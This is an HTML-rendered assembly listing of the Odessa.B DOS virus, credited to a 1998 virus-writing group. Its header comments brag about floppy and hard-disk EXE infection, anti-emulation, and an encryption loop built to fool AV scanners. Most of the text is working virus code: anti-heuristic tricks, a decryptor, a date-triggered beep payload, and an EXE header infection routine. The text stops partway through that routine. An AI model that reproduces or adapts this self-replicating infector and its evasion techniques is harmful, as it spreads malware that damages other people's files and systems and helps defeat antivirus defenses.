<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>odessa_b.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><span class="sc0">
</span><span class="sc1">;                              Odessa.B virus</span><span class="sc0">
</span><span class="sc1">;                       (C) Opic [CodeBreakers '98]</span><span class="sc0">
</span><span class="sc1">;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><span class="sc0">
</span><span class="sc1">;Odessa.B variant is a continuation of Odessa (aka opic.727)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Odessa.B's NEW features:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-Odessa.B will NOW infect .Exe files present on any floppy disks </span><span class="sc0">
</span><span class="sc1">; undetectably (due to a critical error handler).  It does so after</span><span class="sc0">
</span><span class="sc1">; the current HDD is infected. When Odessa.B is present on a floppy</span><span class="sc0">
</span><span class="sc1">; disk it will move imediatly to the HDD to insure infection of new systems.</span><span class="sc0">
</span><span class="sc1">;Thus making it a viable floppy born virus (one of the few outside of the</span><span class="sc0">
</span><span class="sc1">;BS/MBR families)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-an expanded encryption loop </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-some minor bug fixes, and optimisations. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Infected files grow approximatly: 745 bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Old features:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-Exe file infector </span><span class="sc0">
</span><span class="sc1">;-directory transversal via dotdot</span><span class="sc0">
</span><span class="sc1">;-is Windows compatable (ie: will not infect: Windows NE, PE, LE files ect.)</span><span class="sc0">

</span><span class="sc1">;-some anti-emulation</span><span class="sc0">
</span><span class="sc1">;-payload criteria: the virus will activate its payload on </span><span class="sc0">
</span><span class="sc1">; either the 13th or the 6th of any given month provided the seconds</span><span class="sc0">
</span><span class="sc1">; are below 30.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-payload: when activated the virus will beep 6 times before the </span><span class="sc0">
</span><span class="sc1">; infected file is run. I choose this more subtle payload because</span><span class="sc0">
</span><span class="sc1">;it is easily missed, and only creates a bit of curiosity at most.</span><span class="sc0">
</span><span class="sc1">;which is a good aspect since the fact that all infected files will</span><span class="sc0">
</span><span class="sc1">;try to access the floppy drive before running also brings some curious.</span><span class="sc0">
</span><span class="sc1">;Its also somewhat humerous because the telltale signs of this virus</span><span class="sc0">
</span><span class="sc1">;are also what many non-computer literate people constantly write to</span><span class="sc0">
</span><span class="sc1">;AVers about complaining of (to which the AVs constant reply is:</span><span class="sc0">
</span><span class="sc1">;false alarm. There is a signature line:</span><span class="sc0">
</span><span class="sc1">;Odessa.B (c) Opic [Codebreakers 1998] </span><span class="sc0">
</span><span class="sc1">;I have left for the AV to rename for me, as it is never displayed </span><span class="sc0">
</span><span class="sc1">;(hell i figure their gonna anyways :P ).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;detected: Not detected by TBAV as second gen. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><span class="sc0">
</span><span class="sc5">Exe_Infector</span><span class="sc0">  </span><span class="sc9">Segment</span><span class="sc0">
              </span><span class="sc9">Assume</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Exe_Infector</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">Exe_Infector</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">Exe_Infector</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">Exe_Infector</span><span class="sc0">
              </span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;set registers up</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;lame loop</span><span class="sc0">
</span><span class="sc5">noav1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">noav2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">noav2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">noav1</span><span class="sc0">           </span><span class="sc1">;end of antiheur</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;delta offset</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Begin_Virus</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">-</span><span class="sc5">Begin_Virus</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;-------------13</span><span class="sc0">
                </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;------------12</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;-----------11</span><span class="sc0">
                </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;----------10</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;---------9</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;--------8</span><span class="sc0">
                </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;-------7</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;------6</span><span class="sc0">
                </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;-----5</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;----4</span><span class="sc0">
                </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;---3</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;--2</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;-1</span><span class="sc0">
                </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;0            this huge loop may</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;-1           look silly but it</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;--2          kills alot of AV</span><span class="sc0">
                </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;---3         scanners due becuz</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;----4        they think it is</span><span class="sc0">
                </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;-----5       endless</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;------6</span><span class="sc0">
                </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;-------7</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;--------8</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;---------9</span><span class="sc0">
                </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;----------10</span><span class="sc0">
                </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;-----------11</span><span class="sc0">
                </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;&lt;------------12</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;&lt;-------------13</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Begin_Virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Check_Payload</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">          </span><span class="sc1">;system date</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">           </span><span class="sc1">;is it the 31st if the month?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">sec</span><span class="sc0">              </span><span class="sc1">;yes? test seconds!</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">;13th ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">sec</span><span class="sc0">              </span><span class="sc1">;yes seconds!</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CP_Exit</span><span class="sc0">         </span><span class="sc1">;no? restore.</span><span class="sc0">
</span><span class="sc5">sec</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">         </span><span class="sc1">;check time</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">30d</span><span class="sc0">         </span><span class="sc1">;seconds less then 30?</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">CP_Exit</span><span class="sc0">        </span><span class="sc1">;if yes-&gt;payload</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Payload</span><span class="sc0">

</span><span class="sc5">CP_Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Check_Payload</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">           </span><span class="sc1">;back to c:\
                mov dl,02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">         </span><span class="sc1">;beep 6 times.</span><span class="sc0">
</span><span class="sc5">beep</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">beep</span><span class="sc0">        
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">  </span><span class="sc1">;open file</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">End_Virus</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;file handleto bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">  </span><span class="sc1">;exe head into buffer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">  </span><span class="sc1">;check .exe signature</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">its_exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">its_exe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">its_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'B'</span><span class="sc0">  </span><span class="sc1">;our infection check</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_infected</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;make sure its not a</span><span class="sc0">
                                                     </span><span class="sc1">;windbloze exe (pe,ne,le .ect)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                            </span><span class="sc1">; &gt; or =  means windbloze</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;save orginal info from header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_ss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;stack segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;stack pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_sp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;instructional pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_ip</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;code segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;cs:ip =begining of excutable code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">   </span><span class="sc1">;EOF</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;save file size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;header size</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">;convert</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;save header size in cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;restore ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">;subtract header from file size to get code and data size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;IP create new header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;CS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;SS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">0fffeh</span><span class="sc0"> </span><span class="sc1">;SP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'B'</span><span class="sc0"> </span><span class="sc1">;marker</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">;restore filesize</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;dx to ax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">       </span><span class="sc1">;divide new filesize by 512</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_remainder</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">no_remainder</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;save new filesize</span><span class="sc0">
